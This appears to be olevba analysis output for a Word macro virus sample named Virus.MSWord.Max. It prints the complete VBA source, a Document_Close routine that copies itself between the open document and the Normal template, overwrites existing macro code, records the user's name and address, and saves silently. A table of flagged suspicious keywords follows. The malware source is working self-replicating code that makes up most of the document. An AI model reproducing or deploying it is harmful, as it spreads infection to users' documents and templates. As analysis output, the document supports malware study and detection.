olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Max
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Max - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Maxi vir
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = True
user = Chr(13) + "'" + Application.UserName + Chr(13) + "'" + Application.UserAddress + Chr(13) + "'" + Time + Chr(13) + "'" + Date
Namevir = "'Maxi vir"
Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set Nt = NormalTemplate.VBProject.VBComponents(1).CodeModule
'activedocument infected
If ad.lines(1, 1) <> Namevir Then
ad.deletelines 1, ad.countoflines
uservir = Nt.lines(1, Nt.countoflines) + user
ad.addfromstring uservir
activsave = ActiveDocument.Saved
If activesave = True Then
ActiveDocument.Save
End If

End If
'normal template infected
If Nt.lines(1, 1) <> Namevir Then
Nt.deletelines 1, Nt.countoflines
uservir = ad.lines(1, ad.countoflines) + user
Nt.addfromstring uservir
normalsave = NormalTemplate.Saved
If normalsave = True Then
NormalTemplate.Save
End If

End If

'mersi hackers
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

